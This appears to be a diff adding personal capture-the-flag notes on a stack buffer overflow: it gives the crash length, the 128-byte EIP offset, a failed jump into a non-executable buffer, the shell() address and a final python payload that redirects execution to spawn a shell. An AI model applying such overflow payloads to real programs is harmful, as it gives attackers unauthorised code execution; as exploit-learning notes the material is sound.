@@ -1,0 +1,36 @@
+SIGSEV
+======
+
+print "A" * 133
+
+
+EIP Overwrite
+=============
+
+print "A" * 128 + "BBBB"
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
+
+print "CCCCCCCC" + "A" * 120 + "BBBB"
+CCCCCCCCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
+
+ret of "C" (Dead End)
+=====================
+
+0xbffffb1c
+\x1c\xfb\xff\xbf
+
+Shell("/bin/dash")
+==================
+
+address: 
+0x08048464
+\x64\x84\x04\x08
+
+Success
+=======
+At first, I tried to go from EIP to "CCCCCCCCC". Then replace C's with
+the address of shell() for the win. I wasn't allowed to execute from there. 
+So I went from EIP directly to shell() function, and success.
+
+python -c 'print "A" * 128 + "\x64\x84\x04\x08"' > /tmp/fresh2
+
